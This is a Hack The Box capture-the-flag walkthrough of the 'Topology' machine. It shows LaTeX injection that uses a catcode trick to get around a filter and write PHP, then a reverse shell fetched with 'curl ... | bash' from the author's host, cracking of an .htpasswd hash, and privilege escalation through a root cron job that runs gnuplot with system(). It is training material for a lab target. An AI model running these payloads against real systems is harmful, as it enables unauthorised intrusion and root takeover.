---
layout: post
title: Hack The Box Walkthrough - Topology
date: 2023-11-04
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2023/11/HTB/Topology
img: 2023/11/Topology/Topology.png
---

In this machine I had to get code execution through an application that converts LaTeX into images, crack a hash that was on the server, and finally run code through Gnuplot.

* Room: Topology
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Topology](https://app.hackthebox.com/machines/Topology)
* Author: [gedsic](https://app.hackthebox.com/users/22016)

## Enumeration

I started by checking for open ports with rustscan.

```bash
$ rustscan -a target -- -A -Pn | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy
:
: https://github.com/RustScan/RustScan
:--------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.129.114:22
Open 10.129.129.114:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-27 10:31 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.

...

Completed NSE at 10:31, 0.00s elapsed
Nmap scan report for target (10.129.129.114)
Host is up, received user-set (0.11s latency).
Scanned at 2023-08-27 10:31:13 EDT for 8s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
|   256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

...

Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds
```

There were two open ports:
* 22 (SSH)
* 80 (HTTP)


## Website

I open a browser to check the website.

![Website](/assets/images/2023/11/Topology/Website.png "Website")

The website was simple, but it contained a link to 'latex.topology.htb'. I took a note, but kept looking at the main website.

I launched Feroxbuster to check for hidden pages.

```bash
$ feroxbuster -u http://target.htb -o ferox.txt
___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://target.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        9l       28w      309c http://target.htb/images => http://target.htb/images/
301      GET        9l       28w      306c http://target.htb/css => http://target.htb/css/
200      GET      174l      545w     6767c http://target.htb/index.html
200      GET      235l      442w    23427c http://target.htb/css/w3.css
200      GET      754l     3901w   338411c http://target.htb/images/seal.png
200      GET     1846l    10569w   778606c http://target.htb/portraits/dabrahams.jpg
200      GET     2141l    10893w   831181c http://target.htb/portraits/vdaisley.jpg
200      GET     2433l    13135w   950557c http://target.htb/portraits/lklein.jpg
200      GET      174l      545w     6767c http://target.htb/
200      GET      186l      931w    86504c http://target.htb/images/seal.jpg
301      GET        9l       28w      313c http://target.htb/javascript => http://target.htb/javascript/
301      GET        9l       28w      320c http://target.htb/javascript/jquery => http://target.htb/javascript/jquery/
200      GET    10365l    41507w   271809c http://target.htb/javascript/jquery/jquery
301      GET        9l       28w      312c http://target.htb/portraits => http://target.htb/portraits/
[####################] - 3h    125733/125733  0s      found:14      errors:1057
[####################] - 3h    119601/119601  13/s    http://target.htb/
[####################] - 5s    119601/119601  24211/s http://target.htb/images/ => Directory listing
[####################] - 5s    119601/119601  26142/s http://target.htb/css/ => Directory listing
[####################] - 2s    119601/119601  53085/s http://target.htb/portraits/ => Directory listing
[>-------------------] - 6m      3849/119601  11/s    http://target.htb/javascript/
[>-------------------] - 5m      2253/119601  8/s     http://target.htb/javascript/jquery/
```

It did not find anything interesting.

## Subdomains

I added 'topology.htb' and 'latex.topology.htb' to my hosts file and used wfuzz to check for other possible subdomains.


```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 545 -H "Host:FUZZ.topology.htb" "http://topology.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://topology.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   400        10 L     35 W       304 Ch      "*"

Total time: 0
Processed Requests: 402
Filtered Requests: 401
Requests/sec.: 0

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 28: Operation timed out after 90003 milliseconds with 0 bytes received
```

There were none that I could find.

## LaTex Generator

The link from the main site took me to an application that converted [LaTeX](https://www.latex-project.org/) equations to images.

![LaTeX Generator](/assets/images/2023/11/Topology/LaTeXGenerator.png "LaTeXGenerator")

It took formulas in the LaTeX format and converted them to an image.

Sending something simple like '2 + 2' resulted in the following image.

![2 + 2](/assets/images/2023/11/Topology/2+2.png "2 + 2")


I ran Feroxbuster again to check for hidden files in that subdomain.

```bash
$ feroxbuster -u http://latex.topology.htb -o feroxLatex.txt -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://latex.topology.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ feroxLatex.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       18l       18w      662c http://latex.topology.htb/equationtest.aux
200      GET        7l        8w      112c http://latex.topology.htb/equationtest.tex
200      GET        5l       34w     2339c http://latex.topology.htb/example.png
200      GET       82l      217w     2489c http://latex.topology.htb/equation.php
200      GET       16l       73w     4813c http://latex.topology.htb/equationtest.png
200      GET        0l        0w        0c http://latex.topology.htb/equationtest.out
200      GET        9l       65w      502c http://latex.topology.htb/header.tex
200      GET      414l     1756w    17387c http://latex.topology.htb/equationtest.log
200      GET      199l      800w    52029c http://latex.topology.htb/equationtest.pdf
200      GET        6l       24w     1667c http://latex.topology.htb/demo/summ.png
200      GET        7l       27w     1886c http://latex.topology.htb/demo/greek.png
200      GET        9l       28w     1950c http://latex.topology.htb/demo/sqrt.png
200      GET        5l       31w     1817c http://latex.topology.htb/demo/fraction.png
[####################] - 20s       15/15      0s      found:9       errors:0
[####################] - 12s   119601/119601  10132/s http://latex.topology.htb/ => Directory listing
[####################] - 8s    119601/119601  15361/s http://latex.topology.htb/demo/ => Directory listing
[####################] - 4s    119601/119601  31041/s http://latex.topology.htb/tempfiles/ => Directory listing
```

There were a few folder with directory listing enabled. The 'tempfiles' folder looked promising.

I looked for [LaTeX Injection in HackTricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection). There were a few possibilities, but they all seemed to be blocked. When I tried to use most of the provided commands, I got an error back.

![Illegal Command](/assets/images/2023/11/Topology/IllegalCommand.png "Illegal Command")

Most commands that looked like they could help me get a shell were blocked.

I was able to read the first 3 lines of a file.

```
\newread\file \openin\file=/etc/passwd
\read\file to\line \text{\line}
\read\file to\line \text{\line}
\read\file to\line \text{\line}
\closein\file
```

![Read File](/assets/images/2023/11/Topology/ReadFile.png "Read File")

But I could not read an entire file. The `loop` command was blocked. If I tried to read more lines, my code was rejected for being too long.

I also found how to create a file in the 'tempfiles' folder.

```
\newwrite\outfile
\openout\outfile=test.php
\closeout\outfile
```

![Write File](/assets/images/2023/11/Topology/PHPFileCreated.png "Write File")

The file was created, but I could not write any content to it since `/write` was blocked.

I got blocked here for a while. I tried to use different kinds of loops. I looked for alternatives to read and write commands. Nothing worked. 

After some time, I took a look at the forum for the box. It pointed me to [catcodes](https://en.wikibooks.org/wiki/TeX/catcode). I could use this command to change how some characters behave. 

I tried making the underscore (_) behave as the backslash (\\). And then use the _ in my commands to bypass the validation.

```
\catcode`_=0
\newwrite\outfile
\openout\outfile=test.php
_write\outfile{<?php}
_write\outfile{echo 'IN';}
\closeout\outfile
```

It worked, when I reloaded the PHP file, it had some content, and it got executed.

I tried to start a reverse shell in the PHP code. But it got rejected because it was too long. So I created a small script on my machine.

```bash
$ cat s
bash  -i >& /dev/tcp/10.10.14.52/4444  0>&1
```

And then use the vulnerability to download and execute it.

```
\catcode`_=0
\newwrite\outfile
\openout\outfile=test.php
_write\outfile{<?php}
_write\outfile{`curl 10.10.14.52/s | bash`;}
\closeout\outfile
```

This gave my a shell on the server.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.52] from (UNKNOWN) [10.129.129.114] 43592
bash: cannot set terminal process group (960): Inappropriate ioctl for device
bash: no job control in this shell
www-data@topology:/var/www/latex/tempfiles$ whoami
whoami
www-data
```

## User

Getting a user was simple. Once connected to the server, I looked around the webroot for potential credentials.

```bash
www-data@topology:/var/www$ ls -la
total 24
drwxr-xr-x  6 root     root     4096 May 19 13:04 .
drwxr-xr-x 13 root     root     4096 May 19 13:04 ..
drwxr-xr-x  2 www-data www-data 4096 Jan 17  2023 dev
drwxr-xr-x  5 www-data www-data 4096 Jan 17  2023 html
drwxr-xr-x  4 www-data www-data 4096 Aug 27 13:57 latex
drwxr-xr-x  3 www-data www-data 4096 Jan 17  2023 stats

www-data@topology:/var/www$ ls -la dev/
total 40
drwxr-xr-x 2 www-data www-data 4096 Jan 17  2023 .
drwxr-xr-x 6 root     root     4096 May 19 13:04 ..
-rw-r--r-- 1 www-data www-data  100 Jan 17  2023 .htaccess
-rw-r--r-- 1 www-data www-data   47 Jan 17  2023 .htpasswd
-rw-r--r-- 1 www-data www-data 1068 Jan 17  2023 LICENSE
-rw-r--r-- 1 www-data www-data 7101 Jan 17  2023 index.html
-rw-r--r-- 1 www-data www-data 1715 Jan 17  2023 script.js
-rw-r--r-- 1 www-data www-data 5730 Jan 17  2023 styles.css

www-data@topology:/var/www$ cat dev/.htaccess
AuthName "Under construction"
AuthType Basic
AuthUserFile /var/www/dev/.htpasswd
Require valid-user

www-data@topology:/var/www$ cat dev/.htpasswd
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

The dev folder had an .htpasswd file with a password hash for the user vdaisley. I saved it to a file on my machine and used hashcat to crack it.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2866/5796 MB (1024 MB allocatable), 6MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR) | FTP, HTTP, SMTP, LDAP Server

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1


Watchdog: Temperature abort trigger set to 90c

...

$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
Time.Started.....: Sun Aug 27 14:01:23 2023 (39 secs)
Time.Estimated...: Sun Aug 27 14:02:02 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    25661 H/s (7.13ms) @ Accel:64 Loops:500 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 997632/14344384 (6.95%)
Rejected.........: 0/997632 (0.00%)
Restore.Point....: 997248/14344384 (6.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Candidate.Engine.: Device Generator
Candidates.#1....: caldwell3 -> cadelanina
Hardware.Mon.#1..: Util: 95%

Started: Sun Aug 27 14:00:47 2023
Stopped: Sun Aug 27 14:02:04 2023
```

The password was quickly cracked. I used it to reconnect with SSH.

```bash
$ ssh vdaisley@target
The authenticity of host 'target (10.129.129.114)' can't be established.
ED25519 key fingerprint is SHA256:F9cjnqv7HiOrntVKpXYGmE9oEaCfHm5pjfgayE/0OK0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
vdaisley@target's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

vdaisley@topology:~$ cat user.txt
REDACTED
```

## Root

Once connected on the server, I looked for ways to become root. I could not run anything with `sudo`, and I did not see any suspicious `suid` binary. I sent [pspy](https://github.com/DominicBreuker/pspy) to the server and ran it to see what was running.


```bash
daisley@topology:~$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/08/27 14:10:14 CMD: UID=1007  PID=9420   | ./pspy64
2023/08/27 14:10:14 CMD: UID=0     PID=9412   |
2023/08/27 14:10:14 CMD: UID=0     PID=9290   |
2023/08/27 14:10:14 CMD: UID=1007  PID=9127   | -bash
2023/08/27 14:10:14 CMD: UID=1007  PID=9125   | sshd: vdaisley@pts/1
2023/08/27 14:10:14 CMD: UID=1007  PID=9108   | /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
2023/08/27 14:10:14 CMD: UID=113   PID=9061   | /usr/libexec/rtkit-daemon
2023/08/27 14:10:14 CMD: UID=1007  PID=9039   | /usr/bin/pulseaudio --daemonize=no --log-target=journal
2023/08/27 14:10:14 CMD: UID=0     PID=9037   |
2023/08/27 14:10:14 CMD: UID=1007  PID=9033   | (sd-pam)
2023/08/27 14:10:14 CMD: UID=1007  PID=9030   | /lib/systemd/systemd --user
2023/08/27 14:10:14 CMD: UID=0     PID=8991   | sshd: vdaisley [priv]
2023/08/27 14:10:14 CMD: UID=0     PID=8914   |
2023/08/27 14:10:14 CMD: UID=0     PID=8072   |
2023/08/27 14:10:14 CMD: UID=0     PID=8050   |
2023/08/27 14:10:14 CMD: UID=0     PID=7689   |
2023/08/27 14:10:14 CMD: UID=0     PID=6991   |

...

2023/08/27 14:14:01 CMD: UID=0     PID=9489   | /bin/sh -c /opt/gnuplot/getdata.sh
2023/08/27 14:14:01 CMD: UID=0     PID=9488   | /bin/sh -c /opt/gnuplot/getdata.sh
2023/08/27 14:14:01 CMD: UID=0     PID=9487   | /usr/sbin/CRON -f
2023/08/27 14:14:01 CMD: UID=0     PID=9486   | /usr/sbin/CRON -f
2023/08/27 14:14:01 CMD: UID=0     PID=9495   | find /opt/gnuplot -name *.plt -exec gnuplot {} ;
2023/08/27 14:14:01 CMD: UID=0     PID=9494   | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
2023/08/27 14:14:01 CMD: UID=0     PID=9493   |
2023/08/27 14:14:01 CMD: UID=0     PID=9496   | gnuplot /opt/gnuplot/loadplot.plt
2023/08/27 14:14:01 CMD: UID=0     PID=9500   | /bin/sh /opt/gnuplot/getdata.sh
2023/08/27 14:14:01 CMD: UID=0     PID=9499   | /bin/sh /opt/gnuplot/getdata.sh
2023/08/27 14:14:01 CMD: UID=0     PID=9498   | /bin/sh /opt/gnuplot/getdata.sh
2023/08/27 14:14:01 CMD: UID=0     PID=9497   | uptime
2023/08/27 14:14:01 CMD: UID=0     PID=9501   | /bin/sh /opt/gnuplot/getdata.sh
2023/08/27 14:14:01 CMD: UID=0     PID=9502   | /bin/sh /opt/gnuplot/getdata.sh
2023/08/27 14:14:01 CMD: UID=0     PID=9503   | find /opt/gnuplot -name *.plt -exec gnuplot {} ;
2023/08/27 14:15:01 CMD: UID=0     PID=9507   | /usr/sbin/CRON -f
2023/08/27 14:15:01 CMD: UID=0     PID=9506   | /usr/sbin/CRON -f
2023/08/27 14:15:01 CMD: UID=0     PID=9505   | /usr/sbin/CRON -f
2023/08/27 14:15:01 CMD: UID=0     PID=9504   | /usr/sbin/CRON -f
2023/08/27 14:15:01 CMD: UID=0     PID=9508   | find /opt/gnuplot -name *.plt -exec gnuplot {} ;
2023/08/27 14:15:01 CMD: UID=0     PID=9510   | /bin/sh -c /opt/gnuplot/getdata.sh
2023/08/27 14:15:01 CMD: UID=0     PID=9509   | gnuplot /opt/gnuplot/loadplot.plt
```

There was a cron that looked for '.plt' files in '/opt/gunplot' and ran [Gnuplot](http://www.gnuplot.info/) on anything it found.

I could not read anything in that folder, but I was able to write to it.

```bash
vdaisley@topology:~$ ls -ld /opt/gnuplot/
drwx-wx-wx 2 root root 4096 Jun 14 07:45 /opt/gnuplot/
```

I created a file. 

```bash
vdaisley@topology:~$ touch /opt/gnuplot/eric.plt
```

And a few seconds later I saw that it was used.

```bash
2023/08/27 15:45:01 CMD: UID=0     PID=11637  | gnuplot /opt/gnuplot/eric.plt
```

I made some research and found that I could use [system](http://gnuplot.info/docs_5.5/loc2298.html) to run some commands.


```bash
vdaisley@topology:~$ cat /opt/gnuplot/eric.plt
system('touch /tmp/pwn')

vdaisley@topology:~$ ls -ltr /tmp/
total 24
drwx------ 3 root root 4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-systemd-timesyncd.service-cMmOyg
drwx------ 3 root root 4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-systemd-logind.service-RFUHGf
drwx------ 3 root root 4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-ModemManager.service-5yfLmh
drwx------ 3 root root 4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-systemd-resolved.service-QH42of
drwx------ 3 root root 4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-apache2.service-9xAFej
drwx------ 2 root root 4096 Aug 27 10:23 vmware-root_661-4013919860
-rw-r--r-- 1 root root    0 Aug 27 15:49 pwn
```

I used it to copy bash in '/tmp' and set the suid bit on it. After the cron ran, I used the file to become root.

```bash
vdaisley@topology:~$ cat /opt/gnuplot/eric.plt
system('cp /bin/bash /tmp')
system('chmod u+s /tmp/bash')
vdaisley@topology:~$ ls -ltr /tmp/
total 1180
drwx------ 3 root root    4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-systemd-timesyncd.service-cMmOyg
drwx------ 3 root root    4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-systemd-logind.service-RFUHGf
drwx------ 3 root root    4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-ModemManager.service-5yfLmh
drwx------ 3 root root    4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-systemd-resolved.service-QH42of
drwx------ 3 root root    4096 Aug 27 10:21 systemd-private-72e9c23b27b14e45b477ca358d0ab943-apache2.service-9xAFej
drwx------ 2 root root    4096 Aug 27 10:23 vmware-root_661-4013919860
-rw-r--r-- 1 root root       0 Aug 27 15:50 pwn
-rwsr-xr-x 1 root root 1183448 Aug 27 15:51 bash


vdaisley@topology:~$ /tmp/bash -p

bash-5.0# whoami
root

bash-5.0# cat /root/root.txt
REDACTED
```